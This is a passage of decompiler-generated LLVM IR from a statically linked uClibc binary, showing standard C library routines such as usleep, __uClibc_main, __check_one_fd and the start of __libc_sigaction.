dec_label_pc_80513d7:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_80513e1:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_80513e8:                             ; preds = %entry
  %v5_80513ee = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80513f6 = icmp slt i32 %v5_80513ee, 0
  %v1_80513f8 = icmp eq i1 %v2_80513f6, false
  br i1 %v1_80513f8, label %dec_label_pc_805140a, label %dec_label_pc_8051434

dec_label_pc_80513fc:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051403:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_805140a:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80513e8
  br label %dec_label_pc_8051461

dec_label_pc_8051411:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051418:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_805141f:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051426:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_805142d:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051434:                             ; preds = %dec_label_pc_80513e8, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_805133f
  br label %dec_label_pc_8051461

dec_label_pc_8051439:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051440:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051447:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_805144e:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051455:                             ; preds = %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_805145c:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051461:                             ; preds = %dec_label_pc_8051455, %dec_label_pc_805144e, %dec_label_pc_8051447, %dec_label_pc_8051440, %dec_label_pc_8051439, %dec_label_pc_805142d, %dec_label_pc_8051426, %dec_label_pc_805141f, %dec_label_pc_8051418, %dec_label_pc_8051411, %dec_label_pc_8051403, %dec_label_pc_80513fc, %dec_label_pc_805140a, %dec_label_pc_80513e1, %dec_label_pc_80513d7, %dec_label_pc_80513cd, %dec_label_pc_80513c3, %dec_label_pc_80513b9, %dec_label_pc_80513af, %dec_label_pc_80513a5, %dec_label_pc_805139b, %dec_label_pc_8051391, %dec_label_pc_8051387, %dec_label_pc_8051375, %dec_label_pc_8051363, %dec_label_pc_8051359, %dec_label_pc_805134f, %dec_label_pc_8051335, %dec_label_pc_8051434, %dec_label_pc_805145c
  %v0_8051464 = phi i32 [ 255, %dec_label_pc_8051455 ], [ 2048, %dec_label_pc_805144e ], [ 99, %dec_label_pc_8051447 ], [ 20, %dec_label_pc_8051440 ], [ -128, %dec_label_pc_8051439 ], [ 1024, %dec_label_pc_805142d ], [ 4, %dec_label_pc_8051426 ], [ 32, %dec_label_pc_805141f ], [ 256, %dec_label_pc_8051418 ], [ 2147483647, %dec_label_pc_8051411 ], [ 16, %dec_label_pc_8051403 ], [ 127, %dec_label_pc_80513fc ], [ 200112, %dec_label_pc_805140a ], [ 9, %dec_label_pc_80513e1 ], [ 65535, %dec_label_pc_80513d7 ], [ -32768, %dec_label_pc_80513cd ], [ -2147483648, %dec_label_pc_80513c3 ], [ 8, %dec_label_pc_80513b9 ], [ 500, %dec_label_pc_80513af ], [ 4096, %dec_label_pc_80513a5 ], [ 16384, %dec_label_pc_805139b ], [ 1000, %dec_label_pc_8051391 ], [ 32768, %dec_label_pc_8051387 ], [ 6, %dec_label_pc_8051375 ], [ 65536, %dec_label_pc_8051363 ], [ 100, %dec_label_pc_8051359 ], [ 131072, %dec_label_pc_805134f ], [ 1, %dec_label_pc_8051335 ], [ -1, %dec_label_pc_8051434 ], [ 32767, %dec_label_pc_805145c ]
  ret i32 %v0_8051464

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 1000, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 1, 2, 3, 4 }
  uselistorder i32 -2147483648, { 4, 6, 0, 5, 7, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 129, { 1, 0 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 2, 0, 1 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 70, { 1, 2, 0 }
  uselistorder i32 65, { 1, 0, 2, 3 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 50, { 2, 0, 1 }
  uselistorder i32 38, { 1, 2, 0 }
  uselistorder i32 30, { 5, 1, 6, 0, 2, 3, 4 }
  uselistorder i32 26, { 2, 1, 0 }
  uselistorder i32 23, { 1, 2, 0 }
  uselistorder i32 19, { 2, 1, 0 }
  uselistorder i32 13, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051461, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8051434, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_805140a, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051387, { 1, 0 }
  uselistorder label %dec_label_pc_8051375, { 1, 0 }
}

define i32 @usleep(i64 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8051478 = and i64 %arg1, 4294967295
  %v8_8051478 = udiv i64 %v2_8051478, 1000000
  %v9_8051478 = trunc i64 %v8_8051478 to i32
  store i32 %v9_8051478, i32* %stack_var_-8, align 4
  %v2_805148f = bitcast i32* %stack_var_-8 to %timespec*
  %v3_805148f = call i32 @__libc_nanosleep(%timespec* %v2_805148f, i32 0)
  ret i32 %v3_805148f

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051498 = load i32, i32* @ebx, align 4
  store i32 %v0_8051498, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578176), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578176), i32 2), i32 0), label %dec_label_pc_80514ac, label %dec_label_pc_80514b9

dec_label_pc_80514ac:                             ; preds = %entry, %dec_label_pc_80514ac
  %v1_80514b36 = phi i32 [ %v1_80514b3, %dec_label_pc_80514ac ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578176), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_80514b3.249 to i32), i32* %stack_var_-16, align 4
  %v5_80514ac = mul i32 %v1_80514b36, 4
  %v6_80514ac = add i32 %v5_80514ac, ptrtoint (i32* @global_var_8058000.248 to i32)
  %v7_80514ac = inttoptr i32 %v6_80514ac to i32*
  %v8_80514ac = load i32, i32* %v7_80514ac, align 4
  call void @__pseudo_call(i32 %v8_80514ac)
  %v0_80514b3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80514b3 = add i32 %v0_80514b3.pre, -1
  store i32 %v1_80514b3, i32* %ebx.global-to-local, align 4
  %v10_80514b4 = icmp eq i32 %v0_80514b3.pre, 0
  %v1_80514b7 = icmp eq i1 %v10_80514b4, false
  br i1 %v1_80514b7, label %dec_label_pc_80514ac, label %dec_label_pc_80514b9

dec_label_pc_80514b9:                             ; preds = %dec_label_pc_80514ac, %entry
  %v0_80514b9 = load i32, i32* @global_var_805e714.250, align 4
  %v1_80514be = icmp eq i32 %v0_80514b9, 0
  br i1 %v1_80514be, label %dec_label_pc_80514c4, label %dec_label_pc_80514c2

dec_label_pc_80514c2:                             ; preds = %dec_label_pc_80514b9
  %v0_80514c2 = load i32, i32* %stack_var_-16, align 4
  %v1_80514c2 = call i32 @unknown_0(i32 %v0_80514c2)
  br label %dec_label_pc_80514c4

dec_label_pc_80514c4:                             ; preds = %dec_label_pc_80514c2, %dec_label_pc_80514b9
  %v0_80514c4 = load i32, i32* @global_var_805e718.251, align 8
  %v1_80514ca = icmp eq i32 %v0_80514c4, 0
  br i1 %v1_80514ca, label %dec_label_pc_80514d3, label %dec_label_pc_80514ce

dec_label_pc_80514ce:                             ; preds = %dec_label_pc_80514c4
  %v2_80514d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80514d0, i32* %ebx.global-to-local, align 4
  %v0_80514d1 = load i32, i32* %stack_var_-16, align 4
  %v1_80514d1 = call i32 @unknown_0(i32 %v0_80514d1)
  br label %dec_label_pc_80514d3

dec_label_pc_80514d3:                             ; preds = %dec_label_pc_80514c4, %dec_label_pc_80514ce
  %v2_80514d3 = load i32, i32* %stack_var_-16, align 4
  %v2_80514d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80514d4, i32* @edx, align 4
  ret i32 %v2_80514d3

; uselistorder directives
  uselistorder i32 %v1_80514b3, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 2, 1, 0, 3 }
  uselistorder i32* %ebx.global-to-local, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80514d3, { 1, 0 }
  uselistorder label %dec_label_pc_80514ac, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80514da = load i32, i32* @eax, align 4
  ret i32 %v0_80514da
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80514db = load i32, i32* @esi, align 4
  %v0_80514dc = load i32, i32* @ebx, align 4
  store i32 %v0_80514dc, i32* %stack_var_-8, align 4
  %v0_80514e0 = load i32, i32* @eax, align 4
  store i32 %v0_80514e0, i32* @esi, align 4
  %v0_80514e2 = load i32, i32* @edx, align 4
  store i32 %v0_80514e2, i32* @ebx, align 4
  %v4_80514e7 = call i32 @__libc_fcntl(i32 %v0_80514e0, i32 1, i32 %tmp6)
  %v8_80514ef = icmp eq i32 %v4_80514e7, -1
  %v1_80514f0 = icmp eq i1 %v8_80514ef, false
  br i1 %v1_80514f0, label %dec_label_pc_805150b, label %dec_label_pc_80514f2

dec_label_pc_80514f2:                             ; preds = %entry
  %v0_80514f4 = load i32, i32* @ebx, align 4
  %v5_80514fa = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8057080.252, i32 0, i32 0), i32 %v0_80514f4)
  %v1_8051502 = load i32, i32* @esi, align 4
  %v12_8051502 = icmp eq i32 %v5_80514fa, %v1_8051502
  br i1 %v12_8051502, label %dec_label_pc_805150b, label %dec_label_pc_8051506

dec_label_pc_8051506:                             ; preds = %dec_label_pc_80514f2
  %v0_8051506 = call i32 @abort()
  br label %dec_label_pc_805150b

dec_label_pc_805150b:                             ; preds = %dec_label_pc_80514f2, %entry, %dec_label_pc_8051506
  %v2_805150b = load i32, i32* %stack_var_-12, align 4
  %v2_805150c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805150c, i32* @ebx, align 4
  store i32 %v0_80514db, i32* @esi, align 4
  ret i32 %v2_805150b

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 3, 2, 4, 1 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder label %dec_label_pc_805150b, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_8051512 = load i8, i8* @global_var_805e71c.253, align 4
  %v1_8051512 = icmp eq i8 %v0_8051512, 0
  %v1_8051519 = icmp eq i1 %v1_8051512, false
  br i1 %v1_8051519, label %entry.dec_label_pc_805154b_crit_edge, label %dec_label_pc_805151b

entry.dec_label_pc_805154b_crit_edge:             ; preds = %entry
  %v0_805154e.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805154b

dec_label_pc_805151b:                             ; preds = %entry
  store i8 1, i8* @global_var_805e71c.253, align 4
  store i32 4096, i32* @global_var_805e710.178, align 16
  %v0_8051546 = call i32 @_stdio_init()
  br label %dec_label_pc_805154b

dec_label_pc_805154b:                             ; preds = %entry.dec_label_pc_805154b_crit_edge, %dec_label_pc_805151b
  %v0_805154e = phi i32 [ %v0_805154e.pre, %entry.dec_label_pc_805154b_crit_edge ], [ %v0_8051546, %dec_label_pc_805151b ]
  ret i32 %v0_805154e

; uselistorder directives
  uselistorder i8* @global_var_805e71c.253, { 1, 0 }
  uselistorder label %dec_label_pc_805154b, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  store i32 %tmp31, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805e708.254, align 8
  store i32 %arg6, i32* @global_var_805e718.251, align 8
  %v2_8051586 = mul i32 %arg2, 4
  %v3_8051586 = add i32 %tmp31, %v2_8051586
  %v1_8051589 = add i32 %v3_8051586, 4
  store i32 %v1_8051589, i32* @global_var_805e70c.246, align 4
  %v3_8051591 = load i32, i32* %arg3, align 4
  %v14_8051591 = icmp eq i32 %v1_8051589, %v3_8051591
  %v1_8051593 = icmp eq i1 %v14_8051591, false
  br i1 %v1_8051593, label %dec_label_pc_805159b, label %dec_label_pc_8051595

dec_label_pc_8051595:                             ; preds = %entry
  store i32 %v3_8051586, i32* @global_var_805e70c.246, align 4
  br label %dec_label_pc_805159b

dec_label_pc_805159b:                             ; preds = %entry, %dec_label_pc_8051595
  store i32 120, i32* %stack_var_-164, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_80515a0 = ptrtoint i32* %stack_var_-136 to i32
  %v3_80515a5 = bitcast i32* %stack_var_-136 to i8*
  %v4_80515a5 = call i32 @__GI_memset(i8* %v3_80515a5, i32 0, i32 120)
  %v0_80515aa = load i32, i32* @global_var_805e70c.246, align 4
  br label %dec_label_pc_80515b2

dec_label_pc_80515b2:                             ; preds = %dec_label_pc_80515b2, %dec_label_pc_805159b
  %v0_80515b2 = phi i32 [ %v1_80515b5, %dec_label_pc_80515b2 ], [ %v0_80515aa, %dec_label_pc_805159b ]
  %v1_80515b2 = inttoptr i32 %v0_80515b2 to i32*
  %v2_80515b2 = load i32, i32* %v1_80515b2, align 4
  %v3_80515b2 = icmp eq i32 %v2_80515b2, 0
  %v1_80515b5 = add i32 %v0_80515b2, 4
  %v1_80515b8 = icmp eq i1 %v3_80515b2, false
  br i1 %v1_80515b8, label %dec_label_pc_80515b2, label %dec_label_pc_80515d9.preheader

dec_label_pc_80515d9.preheader:                   ; preds = %dec_label_pc_80515b2
  store i32 %v1_80515b5, i32* @ebx, align 4
  %v1_80515d91 = inttoptr i32 %v1_80515b5 to i32*
  %v2_80515d92 = load i32, i32* %v1_80515d91, align 4
  %v3_80515d93 = icmp eq i32 %v2_80515d92, 0
  %v1_80515dc10 = icmp eq i1 %v3_80515d93, false
  br i1 %v1_80515dc10, label %dec_label_pc_80515be.lr.ph, label %dec_label_pc_80515de

dec_label_pc_80515be.lr.ph:                       ; preds = %dec_label_pc_80515d9.preheader
  %v3_805159e = ptrtoint i32* %stack_var_-168 to i32
  %v3_80515c9 = add i32 %v3_805159e, 32
  br label %dec_label_pc_80515be

dec_label_pc_80515be:                             ; preds = %dec_label_pc_80515be.lr.ph, %dec_label_pc_80515d6
  %v1_80515c9 = phi i32 [ %v2_80515d92, %dec_label_pc_80515be.lr.ph ], [ %v2_80515d9, %dec_label_pc_80515d6 ]
  %v0_80515c8 = phi i32 [ %v1_80515b5, %dec_label_pc_80515be.lr.ph ], [ %v1_80515d6, %dec_label_pc_80515d6 ]
  %v6_80515c3 = icmp ugt i32 %v1_80515c9, 14
  br i1 %v6_80515c3, label %dec_label_pc_80515d6, label %dec_label_pc_80515c5

dec_label_pc_80515c5:                             ; preds = %dec_label_pc_80515be
  store i32 8, i32* %stack_var_-164, align 4
  store i32 %v0_80515c8, i32* %stack_var_-168, align 4
  %v2_80515c9 = mul i32 %v1_80515c9, 8
  %v4_80515c9 = add i32 %v3_80515c9, %v2_80515c9
  %v3_80515ce = inttoptr i32 %v4_80515c9 to i16*
  %v4_80515ce = call i32 @memcpy(i16* %v3_80515ce, i32 %v0_80515c8, i32 8)
  %v0_80515d6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80515d6

dec_label_pc_80515d6:                             ; preds = %dec_label_pc_80515be, %dec_label_pc_80515c5
  %v0_80515d6 = phi i32 [ %v0_80515c8, %dec_label_pc_80515be ], [ %v0_80515d6.pre, %dec_label_pc_80515c5 ]
  %v1_80515d6 = add i32 %v0_80515d6, 8
  store i32 %v1_80515d6, i32* @ebx, align 4
  %v1_80515d9 = inttoptr i32 %v1_80515d6 to i32*
  %v2_80515d9 = load i32, i32* %v1_80515d9, align 4
  %v3_80515d9 = icmp eq i32 %v2_80515d9, 0
  %v1_80515dc = icmp eq i1 %v3_80515d9, false
  br i1 %v1_80515dc, label %dec_label_pc_80515be, label %dec_label_pc_80515de

dec_label_pc_80515de:                             ; preds = %dec_label_pc_80515d6, %dec_label_pc_80515d9.preheader
  store i32 %v2_80515a0, i32* @eax, align 4
  %v0_80515e2 = call i32 @_dl_aux_init()
  store i32 %v0_80515e2, i32* @eax, align 4
  %v0_80515e7 = call i32 @__GI___uClibc_init()
  %v1_80515f0 = icmp eq i32 %tmp26, 0
  %v1_80515f2 = icmp eq i1 %v1_80515f0, false
  br i1 %v1_80515f2, label %dec_label_pc_80515f8, label %dec_label_pc_80515f4

dec_label_pc_80515f4:                             ; preds = %dec_label_pc_80515de
  %v1_80515f4 = and i32 %tmp26, -65536
  %v2_80515f4 = or i32 %v1_80515f4, 4096
  br label %dec_label_pc_80515f8

dec_label_pc_80515f8:                             ; preds = %dec_label_pc_80515de, %dec_label_pc_80515f4
  %v0_80515f8 = phi i32 [ %tmp26, %dec_label_pc_80515de ], [ %v2_80515f4, %dec_label_pc_80515f4 ]
  store i32 %v0_80515f8, i32* @global_var_805e710.178, align 16
  %v13_80515fd = icmp eq i32 %tmp25, -1
  %v1_8051602 = icmp eq i1 %v13_80515fd, false
  br i1 %v1_8051602, label %dec_label_pc_805162d, label %dec_label_pc_8051604

dec_label_pc_8051604:                             ; preds = %dec_label_pc_80515f8
  %v0_8051604 = call i32 @getuid()
  store i32 %v0_8051604, i32* @ebx, align 4
  %v0_805160b = call i32 @geteuid()
  %v0_8051610 = load i32, i32* @ebx, align 4
  %v12_8051610 = icmp eq i32 %v0_8051610, %v0_805160b
  %v1_8051612 = icmp eq i1 %v12_8051610, false
  br i1 %v1_8051612, label %dec_label_pc_8051643, label %dec_label_pc_8051614

dec_label_pc_8051614:                             ; preds = %dec_label_pc_8051604
  %v0_8051614 = call i32 @getgid()
  store i32 %v0_8051614, i32* @ebx, align 4
  %v0_805161b = call i32 @getegid()
  %v0_8051620 = load i32, i32* @ebx, align 4
  %v12_8051620 = icmp eq i32 %v0_8051620, %v0_805161b
  %v1_8051622 = icmp eq i1 %v12_8051620, false
  br i1 %v1_8051622, label %dec_label_pc_8051643, label %dec_label_pc_8051624.thread

dec_label_pc_8051624.thread:                      ; preds = %dec_label_pc_8051614
  br label %dec_label_pc_805166d

dec_label_pc_805162d:                             ; preds = %dec_label_pc_80515f8
  %v15_805162d = icmp eq i32 %tmp25, %tmp24
  %v1_8051631 = icmp eq i1 %v15_805162d, false
  br i1 %v1_8051631, label %dec_label_pc_8051643, label %dec_label_pc_8051633

dec_label_pc_8051633:                             ; preds = %dec_label_pc_805162d
  br label %dec_label_pc_8051643

dec_label_pc_8051643:                             ; preds = %dec_label_pc_8051633, %dec_label_pc_805162d, %dec_label_pc_8051614, %dec_label_pc_8051604
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_805164a = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051659 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051668 = call i32 @__check_one_fd()
  br label %dec_label_pc_805166d

dec_label_pc_805166d:                             ; preds = %dec_label_pc_8051624.thread, %dec_label_pc_8051643
  store i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32* %esi.global-to-local, align 4
  %v0_8051672 = load i32, i32* @edi, align 4
  %v1_8051672 = inttoptr i32 %v0_8051672 to i32*
  %v2_8051672 = load i32, i32* %v1_8051672, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578176), i32* %esi.global-to-local, align 4
  store i32 %v2_8051672, i32* inttoptr (i32 134579320 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578176), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_805e714.250, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578173), i32 6), label %dec_label_pc_8051692, label %dec_label_pc_805169e

dec_label_pc_8051692:                             ; preds = %dec_label_pc_805166d, %dec_label_pc_8051692
  %v4_805169247 = phi i32 [ %v1_8051699, %dec_label_pc_8051692 ], [ 0, %dec_label_pc_805166d ]
  %v5_8051692 = mul i32 %v4_805169247, 4
  %v6_8051692 = add i32 %v5_8051692, ptrtoint (i32* @global_var_8058000.248 to i32)
  %v7_8051692 = inttoptr i32 %v6_8051692 to i32*
  %v8_8051692 = load i32, i32* %v7_8051692, align 4
  call void @__pseudo_call(i32 %v8_8051692)
  %v0_8051699 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051699 = add i32 %v0_8051699, 1
  store i32 %v1_8051699, i32* %ebx.global-to-local, align 4
  %v1_805169a.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_805169a = icmp ult i32 %v1_8051699, %v1_805169a.pre
  br i1 %v7_805169a, label %dec_label_pc_8051692, label %dec_label_pc_805169e

dec_label_pc_805169e:                             ; preds = %dec_label_pc_8051692, %dec_label_pc_805166d
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578176), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578176), i32 2), i32 0), label %dec_label_pc_80516b6, label %dec_label_pc_80516c2

dec_label_pc_80516b6:                             ; preds = %dec_label_pc_805169e, %dec_label_pc_80516b6
  %v4_80516b644 = phi i32 [ %v1_80516bd, %dec_label_pc_80516b6 ], [ 0, %dec_label_pc_805169e ]
  store i32 ptrtoint (i32* @global_var_80516bd.257 to i32), i32* %stack_var_-164, align 4
  %v5_80516b6 = mul i32 %v4_80516b644, 4
  %v6_80516b6 = add i32 %v5_80516b6, ptrtoint (i32* @global_var_8058000.248 to i32)
  %v7_80516b6 = inttoptr i32 %v6_80516b6 to i32*
  %v8_80516b6 = load i32, i32* %v7_80516b6, align 4
  call void @__pseudo_call(i32 %v8_80516b6)
  %v0_80516bd = load i32, i32* @ebx, align 4
  %v1_80516bd = add i32 %v0_80516bd, 1
  store i32 %v1_80516bd, i32* @ebx, align 4
  %v1_80516be.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_80516be = icmp ult i32 %v1_80516bd, %v1_80516be.pre
  br i1 %v7_80516be, label %dec_label_pc_80516b6, label %dec_label_pc_80516c2

dec_label_pc_80516c2:                             ; preds = %dec_label_pc_80516b6, %dec_label_pc_805169e
  %v0_80516cb = load i32, i32* %stack_var_-164, align 4
  %v1_80516cb = call i32 @__errno_location(i32 %v0_80516cb)
  %v1_80516d0 = inttoptr i32 %v1_80516cb to i32*
  store i32 0, i32* %v1_80516d0, align 4
  %v0_80516df = call i32 @__GI___h_errno_location()
  store i32 %v0_80516df, i32* @eax, align 4
  %v1_80516e4 = inttoptr i32 %v0_80516df to i32*
  store i32 0, i32* %v1_80516e4, align 4
  %v0_80516eb = load i32, i32* @global_var_805e70c.246, align 4
  store i32 %v0_80516eb, i32* %stack_var_-164, align 4
  %v0_80516f1 = load i32, i32* @edi, align 4
  store i32 %v0_80516f1, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8051700 = load i32, i32* @eax, align 4
  %v1_8051703 = call i32 @__GI_exit(i32 %v0_8051700)
  %v0_805170d = load i32, i32* @ebx, align 4
  %v1_805170d = inttoptr i32 %v0_805170d to %sigcontext*
  %v2_805170d = call i32 @sigreturn(%sigcontext* %v1_805170d)
  %v0_8051715 = load i32, i32* @ebx, align 4
  %v1_8051715 = inttoptr i32 %v0_8051715 to %sigcontext*
  %v2_8051715 = call i32 @sigreturn(%sigcontext* %v1_8051715)
  ret i32 %v2_8051715

; uselistorder directives
  uselistorder i32 %v1_80516bd, { 1, 2, 0 }
  uselistorder i32 %v1_8051699, { 1, 2, 0 }
  uselistorder i32 %v2_80515d9, { 1, 0 }
  uselistorder i32 %v1_80515d6, { 2, 1, 0 }
  uselistorder i32 %v1_80515b5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80515b2, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 3, 4, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578176), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8058000.248 to i32), i32 -134578176), { 0, 2, 1 }
  uselistorder i32 ()* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 4096, { 16, 17, 4, 15, 11, 12, 0, 1, 5, 13, 10, 14, 9, 6, 3, 7, 2, 8 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_80516b6, { 1, 0 }
  uselistorder label %dec_label_pc_8051692, { 1, 0 }
  uselistorder label %dec_label_pc_805166d, { 1, 0 }
  uselistorder label %dec_label_pc_80515f8, { 1, 0 }
  uselistorder label %dec_label_pc_80515d6, { 1, 0 }
  uselistorder label %dec_label_pc_80515be, { 1, 0 }
  uselistorder label %dec_label_pc_805159b, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051717 = load i32, i32* @esi, align 4
  %v0_8051718 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805172d = icmp eq i32* %arg2, null
  br i1 %v1_805172d, label %dec_label_pc_8051780, label %dec_label_pc_8051731

dec_label_pc_8051731:                             ; preds = %entry
  %v2_8051731 = load i32, i32* %arg2, align 4
  store i32 %v2_8051731, i32* %stack_var_-148, align 4
  %v1_805173a = add i32 %tmp11, 4
  %v3_805174c = bitcast i32* %stack_var_-136 to i16*
  %v4_805174c = call i32 @memcpy(i16* %v3_805174c, i32 %v1_805173a, i32 128)
  %v1_8051751 = add i32 %tmp11, 132
  %v2_805176b = inttoptr i32 %v1_8051751 to i8*
  %v3_805176b = load i8, i8* %v2_805176b, align 1
  %v4_805176b = and i8 %v3_805176b, 4
  %v5_805176b = icmp eq i8 %v4_805176b, 0
